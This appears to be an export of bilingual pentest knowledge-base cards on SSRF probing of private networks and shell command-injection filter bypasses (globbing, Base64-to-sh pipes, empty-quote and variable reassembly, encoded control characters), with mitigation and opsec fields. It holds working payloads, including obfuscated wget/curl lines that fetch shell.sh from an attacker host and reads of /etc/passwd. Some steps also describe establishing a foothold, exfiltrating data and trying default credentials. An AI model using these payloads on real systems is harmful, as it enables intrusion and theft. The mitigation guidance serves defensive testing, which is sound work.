title.zh: 核对Windows CMD 枚举命令证据
title.en: Verify Windows CMD Enumeration Commands evidence

description.zh: 工具卡成功仅表示命令在已授权主机产生预期输出；是否存在 RCE 必须由独立注入入口、进程父链和请求关联证明。 对齐各层时间戳并排除输入回显、缓存、统一错误、网络抖动和测试工具自身行为。
description.en: Tool success means only that a command produced expected output on an authorized host; RCE requires independent proof from an injection point, process ancestry, and request correlation. Align timestamps across layers and exclude reflection, caching, generic errors, network jitter, and behavior caused by the test tool itself.

title.zh: 修复并回归Windows CMD 枚举命令
title.en: Remediate and regress Windows CMD Enumeration Commands

description.zh: 迁移内容所有权后，Payload 库只保留能改变解释器语法的字符串；工具卡明确最小权限、输出敏感度和审计要求。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。
description.en: After ownership migration, retain only interpreter-altering strings in the payload library and document least privilege, output sensitivity, and auditing in tool cards. Replay the same three baselines; valid paths should remain functional and anomalous input must no longer alter execution, file access, or final destinations.

review.rationale: 整条记录是独立 Windows CLI/后渗透速查，不是 Payload，应迁往现有工具命令。

prerequisites.zh: 资产清单已给出一个明确授权的 RFC 1918 测试网段与标记服务，不允许把列表当作全网段扫描。
prerequisites.en: The asset inventory identifies one authorized RFC 1918 test segment and marker service; the list must not be used as a subnet scan.

prerequisites.zh: 出站代理或目标服务可记录服务器源地址、唯一请求令牌和最终端口。
prerequisites.en: An egress proxy or target service can record the server source, unique request token, and final port.

analysis.zh: 阳性是服务端获取器跨越外部边界访问已知内网标记服务。不同内网端口返回不同错误、私网地址导致超时、或扫描器猜到网关地址都不证明读取了内部资源。
analysis.en: Positive evidence is the server-side fetcher crossing the external boundary to an authorized internal marker. Different port errors, private-address timeouts, or guessing a gateway does not prove an internal resource was read.

opsecTips.zh: 收到首个内网标记回调即停止，不继续遍历 32 个组合或扩大到同网段其他主机。
opsecTips.en: Stop at the first internal marker callback and do not iterate the 32 combinations or expand to other hosts in the segment.

opsecTips.zh: 关闭测试服务、清除代理重试和连接池状态，并从报告中去除真实私网拓扑信息。
opsecTips.en: Shut down the test service, clear proxy retries and connection-pool state, and remove real private-topology details from the report.

name.zh: 私有网关与服务端口 SSRF 探测

description.zh: 使用 RFC 1918 网段常见网关地址和服务端口，验证服务端请求是否能跨越外部到内网边界。
description.en: Uses common gateway addresses and service ports in RFC 1918 ranges to test whether server-side requests cross from external to internal networks.

subCategory.zh: 回环与内网探测

overview.zh: 私有网关与服务端口 SSRF 探测覆盖内网边界穿越场景：针对服务端 URL 获取功能，验证请求能否经 192.168.0.1/10.0.0.1/172.16.0.1 等网关地址与 8080/3306/6379 等端口跨越外部到内网边界。验证维度为授权网段内单目标逐端口验证。
overview.en: Private-Gateway and Service-Port SSRF Probes covers intranet boundary crossing: for server-side URL fetching, verify whether requests cross the external-to-intranet boundary via gateway addresses such as 192.168.0.1/10.0.0.1/172.16.0.1 with ports 8080/3306/6379. Verification dimensions are per-port validation of a single authorized target segment.

vulnerability.zh: 根因是服务端 URL 获取器缺少解析后私网地址检查或出站网络隔离，外部用户可借应用身份访问 RFC 1918 目标；必须以内部标记服务日志中的唯一令牌与来源地址为证据，响应时间或错误文本差异不构成连接证明。
vulnerability.en: The root cause is a server-side URL fetcher lacking post-resolution private-address checks or egress network isolation, so external users reach RFC 1918 targets under the application's identity; evidence must be a unique token plus source address in the internal marker service's logs — response timing or error-text differences prove no connection.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步先确认出站请求原语成立；再依据资产清单从授权测试网段选择一个网关地址与端口，逐条提交并记录响应差异，同时以不存在端口作负对照并限制单次请求；内部标记服务日志记录应用源地址和唯一令牌即确认内网可达。不要把 URL 列表当作 C 段扫描任务。占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 first confirms the egress request primitive; then choose one gateway address and port from an authorized test segment per the asset inventory, submitting each with recorded response differences while using a nonexistent port as a negative control and limiting to single requests — the internal marker service's log showing the application source and a unique token confirms intranet reachability. Never treat the URL list as a /24 scan. Replace placeholders via the global variables menu.

mitigation.zh: 阻断私网、回环和链路本地地址，使用出站代理允许列表与网络 ACL，并在 DNS 解析与重定向后复核最终目标。修复后用同一正常、阳性和阴性样例回归：合法功能保留，私网目标访问被拒绝。
mitigation.en: Block private, loopback, and link-local addresses, apply an egress-proxy allowlist with network ACLs, and re-verify final targets after DNS resolution and redirects. After the fix, regress with the same positive, negative, and normal samples: legitimate function remains while private-target access is denied.

description.zh: 提交 http://192.168.0.1 到注入点；返回路由器登录页或设备 banner 即内网边界设备可达。
description.en: Submit http://192.168.0.1; a router login page or device banner means the intranet edge device is reachable.

description.zh: 以 192.168.0.x 递增替换第 1 步地址逐一提交到注入点；按响应差异整理出存活主机与开放服务清单备用。
description.en: Increment the step-1 address across 192.168.0.x and submit each; response differences yield the live-host and open-service inventory.

description.zh: 对存活主机续测 /admin 与管理端口等路径内容；命中管理界面即可尝试默认口令进一步渗入内网核心系统。
description.en: Probe /admin and management ports on live hosts; hitting a panel invites default-credential entry into the intranet core.

review.rationale: 条目是私网 SSRF 目标 Payload，不是网络扫描工具 CLI。

description.zh: 绕过对点分十进制私网段规则：192.168.0.1 与 10.0.0.1 转为 32 位整数；内网网关页面返回即成功。
description.en: Convert private ranges to 32-bit integers past dotted-decimal rules; an internal gateway page returning confirms success.

description.zh: 绕过对十进制私网黑名单：十六进制表示同一目标；服务响应差异出现即成功。
description.en: Represent the same targets hexadecimally against decimal blacklists; a differing service response confirms success.

description.zh: 绕过按地址族分别过滤的规则：以映射形式访问私网；内网服务可达即成功。
description.en: Access private ranges in mapped form against per-family filtering; the internal service being reachable confirms success.

prerequisites.zh: 已核实原标题“7条”与实际 execution[0] 六行不符，并按索引区分 file、Redis Gopher、FTP、TFTP 与 netdoc。
prerequisites.en: Verify that the title claims seven entries while execution[0] has six lines, indexed across file, Redis Gopher, FTP, TFTP, and netdoc.

prerequisites.zh: 分别具备无害标记文件、受控 Redis 和受控 FTP/TFTP 服务，避免用一个响应标准覆盖所有协议。
prerequisites.en: Have separate harmless marker files, a controlled Redis instance, and controlled FTP or TFTP services so one response criterion is not reused across protocols.

analysis.zh: split 的阳性证据按协议不同：0-1 需文件读取审计，2 需 Redis 解析 RESP，3-5 需相应服务器回调。URI 回显、统一不支持 scheme 错误、或任一协议成功都不能推断其他行有效。
analysis.en: Positive split evidence is protocol-specific: indexes 0-1 require file-read audit, index 2 requires Redis RESP parsing, and indexes 3-5 require matching server callbacks. URI reflection, a generic unsupported-scheme error, or success of one protocol says nothing about the others.

opsecTips.zh: 每个协议只验证一个无害标记，取得首个可归属证据后停止，禁止执行 Redis 写入或读取真实日志。
opsecTips.en: Validate one harmless marker per protocol and stop after the first attributable result; do not perform Redis writes or read real logs.

opsecTips.zh: 关闭临时协议服务、删除标记文件，并核对六行均迁入目标卡且原混合集不再保留导航入口。
opsecTips.en: Shut down temporary protocol services, delete marker files, and verify all six lines moved to target cards with no remaining navigation entry for the mixed source.

name.zh: 多协议 SSRF/File 混合集（待拆分）

description.zh: 六行内容混合 file 本地读取、Gopher Redis 请求、FTP、TFTP 与 netdoc，协议、后端和成功证据均不同。
description.en: The six lines mix local file reads, a Gopher Redis request, FTP, TFTP, and netdoc with different protocols, backends, and success evidence.

subCategory.zh: 多协议请求拆分

overview.zh: 多协议 SSRF/File 混合集（待拆分）用于原标题声称七条但实际只有六行，且 file:// 与网络协议不能共享一个攻击链或缓解模型。 审校时先确认执行主体、解析器、平台和授权测试对象，并保留未修改请求或命令作为正常基线。
overview.en: Mixed Multi-Protocol SSRF/File Corpus (Split Required) is intended for this boundary: The title claims seven entries but only six lines exist, and file:// cannot share one attack chain or mitigation model with network protocols. Confirm the execution principal, parser, platform, and authorized test object, and retain an unmodified baseline.

vulnerability.zh: URL 获取器允许非 HTTP scheme，底层库会把同一输入交给文件系统或不同网络协议处理器，跨越不同信任边界。 结论必须落到实际信任边界，不能把字符串外观、工具输出或中间层状态变化直接当成漏洞。
vulnerability.en: The URL fetcher permits non-HTTP schemes, causing the same input to reach filesystem or distinct network protocol handlers across different trust boundaries. The conclusion must identify the real trust boundary rather than treating string appearance, tool output, or intermediary status changes as a vulnerability.

exploitation.zh: 按行索引把 file 行迁到 SSRF file 卡、Redis Gopher 行迁到 Redis 卡，其余协议迁到通用协议卡，并逐个使用无害标记。 file 需要真实文件读取审计，Gopher 需要后端协议日志，FTP/TFTP 需要受控服务器回调；统一错误或 URI 回显不可共用。 全程关联原始输入、规范化结果、进程或网络日志和最终业务影响，形成可重复的阳性与阴性证据。
exploitation.en: Route file lines to the SSRF file card, the Redis Gopher line to Redis, and remaining schemes to a protocol card, using one harmless marker at a time. file requires file-read audit, Gopher requires backend protocol logs, and FTP/TFTP require controlled server callbacks; generic errors or URI reflection are not shared evidence. Correlate raw input, canonicalized values, process or network logs, and final business impact to build repeatable positive and negative evidence.

mitigation.zh: 只允许明确的 HTTPS 目标，禁用 file、gopher、ftp、tftp、netdoc 等 scheme，并用网络层出站策略限制后端。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。
mitigation.en: Allow only explicit HTTPS targets, disable file, gopher, ftp, tftp, netdoc, and other schemes, and constrain backend egress at the network layer. After remediation, replay the same normal, positive, and negative cases to preserve valid behavior and remove the former interpreter, file, or network-boundary difference.

title.zh: 确认多协议请求拆分适用边界
title.en: Confirm the Multi-Protocol Request Split boundary

description.zh: 原标题声称七条但实际只有六行，且 file:// 与网络协议不能共享一个攻击链或缓解模型。 记录正常输入、执行主体、组件版本和相关进程、文件或网络日志基线。
description.en: The title claims seven entries but only six lines exist, and file:// cannot share one attack chain or mitigation model with network protocols. Record normal input, the execution principal, component version, and relevant process, file, or network-log baseline.

title.zh: 提交受控多协议请求拆分样例
title.en: Submit a controlled Multi-Protocol Request Split case

description.zh: 按行索引把 file 行迁到 SSRF file 卡、Redis Gopher 行迁到 Redis 卡，其余协议迁到通用协议卡，并逐个使用无害标记。 一次只验证一种机制，并以唯一无害标记替代真实敏感读取、系统修改或无边界扫描。
description.en: Route file lines to the SSRF file card, the Redis Gopher line to Redis, and remaining schemes to a protocol card, using one harmless marker at a time. Validate one mechanism at a time and use a unique harmless marker instead of sensitive reads, system changes, or unbounded scanning.

title.zh: 核对多协议请求拆分证据

description.zh: file 需要真实文件读取审计，Gopher 需要后端协议日志，FTP/TFTP 需要受控服务器回调；统一错误或 URI 回显不可共用。 对齐各层时间戳并排除输入回显、缓存、统一错误、网络抖动和测试工具自身行为。
description.en: file requires file-read audit, Gopher requires backend protocol logs, and FTP/TFTP require controlled server callbacks; generic errors or URI reflection are not shared evidence. Align timestamps across layers and exclude reflection, caching, generic errors, network jitter, and behavior caused by the test tool itself.

title.zh: 修复并回归多协议请求拆分
title.en: Remediate and regress Multi-Protocol Request Split

description.zh: 只允许明确的 HTTPS 目标，禁用 file、gopher、ftp、tftp、netdoc 等 scheme，并用网络层出站策略限制后端。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。
description.en: Allow only explicit HTTPS targets, disable file, gopher, ftp, tftp, netdoc, and other schemes, and constrain backend egress at the network layer. Replay the same three baselines; valid paths should remain functional and anomalous input must no longer alter execution, file access, or final destinations.

review.rationale: 六行跨文件系统、Redis 和三种网络协议，必须按逐行索引拆分。

prerequisites.zh: 目标为会执行文件名展开的 Unix Shell，并已记录 glob 选项、当前目录和 PATH。
prerequisites.en: The target is a Unix shell that performs filename expansion, with glob options, current directory, and PATH recorded.

prerequisites.zh: 隔离目录内只存在一个可匹配的无害测试程序，避免模式展开到 `/bin` 或 `/usr/bin` 真实命令。
prerequisites.en: An isolated directory contains exactly one matching harmless test program so patterns cannot expand to real commands under `/bin` or `/usr/bin`.

analysis.zh: 阳性要求 Shell 将通配模式展开为测试程序路径并启动它，且无匹配/多匹配对照不执行。WAF 不命中、模式字符串被原样传递、或 Shell 报 No such file 都是假阳性。
analysis.en: Positive evidence requires the shell to expand the glob to the test program and start it, while no-match and multi-match controls do not execute. A silent WAF, literal pattern passing, or a no-such-file error is false positive.

opsecTips.zh: 唯一模式成功展开一次后停止，禁止使用原始 `/bin/ca?` 或下载器模式访问系统文件和网络。
opsecTips.en: Stop after one unique pattern expansion and do not use source `/bin/ca?` or downloader patterns against system files or the network.

opsecTips.zh: 删除测试程序和隔离目录，恢复 PATH/glob 设置并确认没有下载文件或后台子进程。
opsecTips.en: Delete the test program and isolated directory, restore PATH and glob settings, and verify that no downloads or background processes remain.

name.zh: Shell 通配符命令名绕过

description.zh: 利用 ?, 字符类和星号让 Shell 在文件系统展开可执行路径，验证命令关键词过滤是否被通配符绕过。
description.en: Uses ?, character classes, and * so the shell expands executable paths, testing whether command-name filtering is bypassed by globbing.

subCategory.zh: 文件名展开命令注入

overview.zh: Shell 通配符命令名绕过针对命令关键词过滤的场景：?、字符类和星号让 Shell 在文件系统展开可执行路径，被阻止的命令在过滤后恢复。验证 /bin/ca? 与 wge? 等通配变体的执行行为。
overview.en: Shell glob command-name bypass targets command keyword filtering: ?, character classes, and asterisks make the shell expand executable paths over the filesystem, restoring blocked commands after filtering. It validates execution of /bin/ca? and wge? glob variants.

vulnerability.zh: 过滤器检查原始命令名，而 Shell 在过滤后将通配模式展开成真实可执行路径，恢复被阻止的命令；载荷依赖 Unix 文件系统存在唯一匹配路径，匹配多个文件时行为可能不同。
vulnerability.en: Filters check raw command names while the shell expands glob patterns into real executable paths after filtering, restoring blocked commands; payloads depend on unique path matches in the Unix filesystem—multiple matches may behave differently.

exploitation.zh: 按第 1 步在同构环境先确认通配模式唯一匹配（如 /bin/ca? 命中 /bin/cat），再逐条提交 /bin/ca?、/bin/ca[s]、/bin/ca[t] 读取类变体与 /usr/bin/wge? 下载变体；命中判据为响应包含 /etc/passwd 内容（root:x:0:0:…）或攻击者 HTTP 日志收到 shell.sh 下载请求。匹配多义时记录展开结果；过滤层放行而命令未执行的差异一并留存。
exploitation.en: Per step 1, first confirm unique pattern matches in an isomorphic environment (e.g., /bin/ca? hitting /bin/cat), then submit /bin/ca?, /bin/ca[s], and /bin/ca[t] read variants plus the /usr/bin/wge? download variant one by one; a hit is /etc/passwd content (root:x:0:0:…) in the response or shell.sh download requests in your HTTP log. Record expansion results when matches are ambiguous, and keep filter-pass versus non-execution differences as evidence.

mitigation.zh: 不用 Shell 解析用户输入，以固定可执行路径和 argv 调用；若必须处理路径，关闭 glob 并对规范路径允许列表校验。修复后用同一正常、阳性和阴性样例回归，确认合法功能保留且通配模式不再展开为被禁命令。
mitigation.en: Never let the shell parse user input—invoke fixed executable paths with argv; when paths must be handled, disable glob and allowlist-validate canonical paths. After the fix, regress with the same normal, positive, and negative samples, confirming legitimate features persist and glob patterns no longer expand into forbidden commands.

title.en: Confirm the command name is blocked

description.zh: 提交明文 cat 路径确认关键字过滤的拦截行为与提示。命中判据：明文形式被拒绝执行，为下一步利用保留完整的输出内容。
description.en: Submit the plaintext cat path to confirm keyword blocking. Success: plaintext is rejected.

description.zh: 以 /bin/ca? 与方括号通配形式重组命令路径执行读取。命中判据：返回 passwd 文件内容。
description.en: Rebuild the binary path as /bin/ca? or bracket globs. Success: passwd content is returned.

description.zh: 用第 2 步载荷的通配变体穿透检测规则提交。命中判据：变体未触发拦截且命令执行成功，同时排除缓存或随机因素干扰。
description.en: Push the wildcard variants from step 2 through the rules. Success: they pass and execute.

title.en: Fetch a script for a foothold

description.zh: 以通配重组的 wget、curl 拉取远端脚本并执行。命中判据：攻击者日志出现下载请求记录，整个过程可随时重复执行。
description.en: Fetch a remote script with globbed wget/curl names. Success: the fetch appears in logs.

review.rationale: 通配符在 Shell 中重建命令路径，是实际命令注入 Payload。

prerequisites.zh: 目标命令链确实包含 Base64 解码器与 sh/bash 管道，而不是仅做数据解码或存储。
prerequisites.en: The target chain includes a Base64 decoder piped to sh or bash rather than only decoding or storing data.

prerequisites.zh: 准备编码后的固定无害令牌，并能区分解码器进程与随后启动的 Shell。
prerequisites.en: Prepare an encoded harmless fixed token and distinguish the decoder process from the shell it launches.

analysis.zh: 阳性是解码输出进入指定 Shell 并由该 Shell 产生令牌，且只解码对照不执行。解码正确、管道创建但 Shell 未读取、或响应中出现 `/etc/passwd` 字样均是假阳性。
analysis.en: Positive evidence is decoded output entering the designated shell and that shell producing the token while a decode-only control does not execute. Correct decoding, a pipe without shell consumption, or `/etc/passwd` text in a response is false positive.

opsecTips.zh: 一次受控令牌执行后停止，不运行原始读取命令，也不尝试交互 Shell 或下载脚本。
opsecTips.en: Stop after one controlled token execution; do not run the source read command or attempt an interactive shell or script download.

opsecTips.zh: 终止测试管道，清理 Shell 历史、解码临时文件和缓存，并复核没有子 Shell 存活。
opsecTips.en: Terminate the test pipeline, clear shell history, decoder temporary files, and caches, and verify no child shell remains alive.

name.zh: Base64 解码后管道执行

description.zh: 把 Base64 明文通过管道送入 sh/bash 或命令替换，验证编码检查与执行阶段之间的二次解释。
description.en: Pipes Base64-decoded text into sh or bash, or uses command substitution, to test second-stage interpretation between filtering and execution.

subCategory.zh: 分隔符与编码执行变体

overview.zh: Base64 解码后管道执行针对把解码明文送入 sh/bash 的场景：管道执行与命令替换的进程树和风险需要分别观察。验证 echo|base64 -d|sh 四种 Shell 组合的执行行为。
overview.en: Base64 decode-to-shell pipeline targets feeding decoded plaintext into sh/bash: pipeline execution and command substitution differ in process tree and risk, observed separately. It validates execution across the four echo|base64 -d|shell combinations.

vulnerability.zh: 防护在编码文本层判断，而后端先解码再启动 Shell 解析明文，导致危险语法在安全检查之后出现；解码结果进入 Shell 即构成完整执行链。
vulnerability.en: Defenses judge at the encoded-text layer while the backend decodes first then launches a shell to parse plaintext, so dangerous syntax appears after security checks; decoded results entering a shell complete the execution chain.

exploitation.zh: 按第 1 步把 cat /etc/passwd 以 Base64 编码后经 echo|base64 -d 管道分别交给 sh、bash、/bin/bash、/bin/sh 逐条执行；命中判据为响应包含 /etc/passwd 内容且请求中无明文 cat。逐条记录响应与进程树差异（管道执行的子进程链）；需要其他命令时用 echo -n '命令'|base64 重新编码后替换载荷。
exploitation.en: Per step 1, Base64-encode cat /etc/passwd and pipe it through echo|base64 -d into sh, bash, /bin/bash, and /bin/sh one by one; a hit is /etc/passwd content in the response with no plaintext cat in the request. Record responses and process-tree differences (the piped child chain) per variant; for other commands, re-encode with echo -n 'cmd'|base64 and swap the payload.

mitigation.zh: 永不执行用户可控解码结果，移除 shell 管道并在解码后进行数据 Schema 校验；以固定函数完成业务动作。修复后用同一正常、阳性和阴性样例回归，确认合法功能保留且解码结果不再进入任何 Shell。
mitigation.en: Never execute user-controllable decoded results—remove shell pipelines and validate decoded data against a schema; complete business actions with fixed functions. After the fix, regress with the same normal, positive, and negative samples, confirming legitimate features persist and decoded results never reach any shell.

description.zh: 提交明文 cat 命令确认拦截行为与提示的形态。命中判据：明文形式被规则拒绝执行，并且输出内容完整可供利用。
description.en: Submit plaintext cat to confirm blocking. Success: the plaintext form is rejected.

description.zh: 把命令 Base64 编码后经管道解码交给 sh 或 bash 执行。命中判据：返回输出且请求中无明文命令。
description.en: Pipe a Base64 blob through base64 -d into sh/bash. Success: output returns with no plaintext.

description.zh: 换解码器与 shell 的组合形式穿透检测规则限制。命中判据：变体组合可以稳定执行命令，为后续深入利用打下基础。
description.en: Vary decoder and shell combinations to slip the rules. Success: a combination executes reliably.

description.zh: 以编码形式构造读取 passwd 等目标的命令执行。命中判据：文件内容成功返回响应，并且重复提交时可以稳定复现该结果。
description.en: Read passwd and similar targets entirely in encoded form. Success: file content returns.

review.rationale: 该记录是明确的解码到 Shell 注入链，而非 Base64 工具教程。

prerequisites.zh: 确认目标 Shell 对未定义变量、反斜杠和空引号的处理规则，并记录 nounset 等选项。
prerequisites.en: Confirm how the target shell handles undefined variables, backslashes, and empty quotes, including options such as nounset.

prerequisites.zh: 在隔离 PATH 中配置一个名称可被重组的无害程序，且不存在同名系统命令。
prerequisites.en: Configure a harmless reassemblable program in an isolated PATH with no same-named system command.

analysis.zh: 阳性是空变量/引号/转义经词法处理后形成测试程序的单一 argv[0]。未定义变量报错、字符串仅在日志中拼接、或下载 URL 被解析但未启动命令都属于假阳性。
analysis.en: Positive evidence is lexical processing of empty variables, quotes, or escapes into one argv[0] for the test program. Undefined-variable errors, log-only concatenation, or a parsed download URL without command execution are false positives.

opsecTips.zh: 验证三类机制中任一最小样例后停止，不继续尝试 wget/curl 原始行或外部下载。
opsecTips.en: Stop after one minimal case from any mechanism and do not continue to the source wget or curl lines or external downloads.

opsecTips.zh: 恢复环境变量和 PATH，删除测试程序，并检查没有空变量配置、下载文件或审计噪声残留。
opsecTips.en: Restore environment variables and PATH, delete the test program, and check that no empty-variable settings, downloads, or audit noise remain.

name.zh: Shell 变量与空引号令牌重组
name.en: Shell Variable and Empty-Quote Token Reassembly

description.zh: 利用未定义变量、反斜杠与空引号把被拆开的命令名在 Shell 中重新组合，测试关键词防护。
description.en: Uses undefined variables, backslashes, and empty quotes to reassemble fragmented command names in the shell and test keyword controls.

subCategory.zh: 分隔符与编码执行变体

overview.zh: Shell 变量与空引号令牌重组针对利用未定义变量、反斜杠与空引号重组被拆开命令名的场景：三种 Shell 词法行为需按实际 Shell 逐类验证。验证 c${undefined}at 等变体对关键词防护的穿透。
overview.en: Shell variable and empty-quote token reassembly targets rebuilding split command names via undefined variables, backslashes, and empty quotes—three shell lexical behaviors validated per class against the actual shell. It tests how c${undefined}at-style variants penetrate keyword defenses.

vulnerability.zh: 过滤器只匹配原始连续关键字，Shell 随后删除空展开、转义符和引用边界，使片段恢复为同一命令名；静态过滤与实际执行语义因此分离。
vulnerability.en: Filters match only original contiguous keywords while the shell removes empty expansions, escapes, and quote boundaries, restoring fragments into one command name; static filtering and actual execution semantics thus diverge.

exploitation.zh: 按第 1 步以 c${undefined}at、c${DOESNOTEXIST}at、c\a\t、c''at 四类变体拆分 cat/wget/curl 关键字后逐条执行；命中判据为响应包含 /etc/passwd 内容或攻击者 HTTP 日志收到 shell.sh 下载请求。逐类记录展开与重组行为，确认目标 Shell 对空变量、反斜杠与空引号的处理；过滤层放行记录作为规则盲区证据。
exploitation.en: Per step 1, split the cat/wget/curl keywords with the four variant classes c${undefined}at, c${DOESNOTEXIST}at, c\a\t, and c''at and execute one by one; a hit is /etc/passwd content in the response or shell.sh download requests in your HTTP log. Record expansion and reassembly behavior per class, confirming how the target shell treats empty variables, backslashes, and empty quotes; keep filter-pass records as rule-blind-spot evidence.

mitigation.zh: 使用无 Shell 的参数数组调用，清理不需要的环境变量并允许列表化可执行动作；禁止依赖字符串关键词阻断。修复后用同一正常、阳性和阴性样例回归，确认合法功能保留且拆分关键字不再重组为可执行命令。
mitigation.en: Invoke via shell-free argument arrays, clean unneeded environment variables, and allowlist executable actions; never rely on string-keyword blocking. After the fix, regress with the same normal, positive, and negative samples, confirming legitimate features persist and split keywords no longer reassemble into executable commands.

description.zh: 提交明文 cat 与 wget 确认过滤口径与拦截提示。命中判据：明文形式被规则拦截执行，多次提交均能得到相同结果。
description.en: Submit plaintext cat/wget to map the filter. Success: plaintext is blocked.

attackChain.payload:
c${undefined}at /etc/passwd
c${DOESNOTEXIST}at /etc/passwd
c\a\t /etc/passwd
c''at /etc/passwd
c""at /etc/passwd
w''get http://{ATTACKER_HOST}/shell.sh
c''u''r''l http://{ATTACKER_HOST}/shell.sh

description.zh: 以未定义变量、反斜杠与空引号拆分 cat、wget 关键字后执行读取。命中判据：返回 passwd 内容或攻击者日志出现下载请求。
description.en: Split keywords with undefined vars, escapes and empty quotes. Success: content or fetches occur.

attackChain.payload:
c${undefined}at /etc/passwd
c${DOESNOTEXIST}at /etc/passwd
c\a\t /etc/passwd
c''at /etc/passwd
c""at /etc/passwd
w''get http://{ATTACKER_HOST}/shell.sh
c''u''r''l http://{ATTACKER_HOST}/shell.sh

description.zh: 用第 2 步载荷的组合形式穿透关键字检测规则。命中判据：组合变体没有被检测拦截，并且该效果可以稳定重复取得。
description.en: Push the combined forms from step 2 past the detector. Success: they are not flagged.

title.en: Fetch and call back for control

description.zh: 以重组后的 wget、curl 拉取脚本并执行建立据点。命中判据：接收端出现下载请求与回连，为下一步利用保留完整的输出内容。
description.en: Fetch a script with rebuilt wget/curl and execute it. Success: requests and callbacks arrive.

review.rationale: 变量和引用重组改变 Shell 令牌，是命令注入 Payload。

prerequisites.zh: 已绘制代理、框架和 Shell 的 URL 解码顺序，明确 `%0a`、`%0d` 与 `%09` 在哪一层变为控制字节。
prerequisites.en: Map decoding across proxy, framework, and shell and identify where `%0a`, `%0d`, and `%09` become control bytes.

prerequisites.zh: 能捕获原始请求、应用参数和最终 argv，且后续动作只输出固定标记。
prerequisites.en: Capture raw requests, application parameters, and final argv, with the follow-on action limited to a fixed marker.

analysis.zh: 阳性需证明控制字节在应用解码后形成新的命令或参数边界并产生标记。HTML 换行、日志注入、代理拆请求、或 400/500 错误变化都是假阳性。
analysis.en: Positive evidence proves that a decoded control byte creates a new command or argument boundary and produces the marker. HTML line breaks, log injection, proxy request splitting, or changed 400 or 500 errors are false positives.

opsecTips.zh: 首次确认一个 CR/LF/Tab 边界后停止，禁止继续用读取文件的原始后缀扩大影响。
opsecTips.en: Stop after confirming one CR, LF, or Tab boundary and do not extend impact with the source file-read suffixes.

opsecTips.zh: 清除代理和应用中的测试请求副本，转义日志控制字符，并确认没有拆分请求或重试任务遗留。
opsecTips.en: Remove test-request copies from proxy and application state, escape controls in logs, and verify no split request or retry job remains.

name.zh: 控制字符解码命令注入

description.zh: 使用百分号编码换行、回车和制表符改变命令名或参数边界，验证解码层与 Shell 解析差异。
description.en: Uses percent-encoded newline, carriage return, and tab characters to alter command names or argument boundaries and test decoder/shell differences.

subCategory.zh: CR/LF/Tab 解码绕过

overview.zh: 控制字符解码命令注入针对百分号编码换行、回车和制表符改变命令边界的场景：解码层与 Shell 解析是两层结果。验证 %0a、%0d%0a、%09 变体在 URL 解码后作为分隔符或空格的行为。
overview.en: Control-character decoding command injection targets percent-encoded newlines, carriage returns, and tabs changing command boundaries: the decoding layer and shell parsing are two result layers. It validates %0a, %0d%0a, and %09 variants acting as separators or spaces after URL decoding.

vulnerability.zh: 网关按编码文本校验，应用解码后把 CR、LF 或 Tab 交给 Shell，控制字节在防护之后成为空白或命令边界；两层结果必须分别记录。
vulnerability.en: Gateways validate encoded text while the application decodes and hands CR, LF, or Tab to the shell—control bytes become whitespace or command boundaries after the defense; the two layer results must be recorded separately.

exploitation.zh: 按第 1 步逐条提交 c%0aat /etc/passwd、c%0d%0aat、;cat%09/etc/passwd、;cat%0a 等变体；命中判据为响应包含 /etc/passwd 内容，证明控制字符在解码后承担了分隔符或空格职能。逐条记录 URL 解码层是否发生与 Shell 是否接受两类结果；单层放行而命令未执行时，检查中间层是否存在二次编码或过滤。
exploitation.en: Submit c%0aat /etc/passwd, c%0d%0aat, ;cat%09/etc/passwd, ;cat%0a, and similar variants one by one per step 1; a hit is /etc/passwd content in the response, proving control characters took on separator or space roles after decoding. Record both whether URL decoding occurred and whether the shell accepted the byte per request; when a layer passes but commands do not run, check intermediate layers for double encoding or filtering.

mitigation.zh: 在边界只解码一次，拒绝控制字符和非规范编码，并以固定程序 argv 调用；日志单独转义 CR/LF。修复后用同一正常、阳性和阴性样例回归，确认合法功能保留且控制字节不再改变命令结构。
mitigation.en: Decode once at the boundary, reject control characters and non-canonical encodings, and invoke via fixed program argv; escape CR/LF separately in logs. After the fix, regress with the same normal, positive, and negative samples, confirming legitimate features persist and control bytes no longer change command structure.

description.zh: 提交常规分号与空格形式确认过滤的拦截口径。命中判据：常规分隔形式被规则拒绝执行，同时排除缓存或随机因素干扰。
description.en: Submit plain semicolon/space forms to map the filter. Success: the plain forms are rejected.

description.zh: 以 %0a、%0d%0a 与 %09 替代分隔符和空格执行命令。命中判据：返回 passwd 文件内容。
description.en: Replace separators/spaces with %0a, %0d%0a and %09. Success: passwd content is returned.

description.zh: 组合控制字符与命令体的形式穿透检测规则限制。命中判据：组合变体可以稳定执行命令，整个过程可随时重复执行。
description.en: Combine control bytes with command bodies to pass rules. Success: combinations execute reliably.

description.zh: 以命中的变体执行读取与外带命令获取数据。命中判据：内容返回响应或到达接收端，并且输出内容完整可供利用。
description.en: Run read/exfil commands with the winning variants. Success: content returns or arrives.

review.rationale: 控制字符经解码后改变 Shell 语法，属于命令注入 Payload。

prerequisites.zh: 已确定入口闭合方式和目标 Shell，能够分别测试分隔符、命令替换、IFS 与大括号扩展。
prerequisites.en: Determine the entry closure and target shell and be able to test separators, command substitution, IFS, and brace expansion separately.

prerequisites.zh: 所有原始敏感命令均替换成无副作用令牌生成器，并启用请求到进程树关联。
prerequisites.en: Replace every sensitive source command with a side-effect-free token generator and enable request-to-process-tree correlation.

analysis.zh: 阳性是某一明确 Shell 展开阶段创建标记子进程，且同闭合的阴性对照不执行。文件内容出现在缓存、WAF 规则命中、或 `{cat,...}` 被当普通字符串都不能证明注入。
analysis.en: Positive evidence is a marker child process created at a specific shell expansion stage while a same-closure negative control does not execute. Cached file content, a WAF match, or `{cat,...}` treated literally does not prove injection.

opsecTips.zh: 每种展开类别最多取得一个阳性即停止，不串联多个机制或执行最后一行的交互 Bash 管道。
opsecTips.en: Stop after at most one positive per expansion category and do not chain mechanisms or run the final interactive Bash pipeline.

opsecTips.zh: 终止所有标记子进程，删除测试输出和命令历史，并复核没有 FIFO、Shell 或下载产物。
opsecTips.en: Terminate all marker child processes, delete test output and command history, and verify that no FIFO, shell, or downloaded artifact remains.

name.zh: Shell 分隔、替换与大括号扩展注入
name.en: Shell Separator, Substitution, and Brace-Expansion Injection

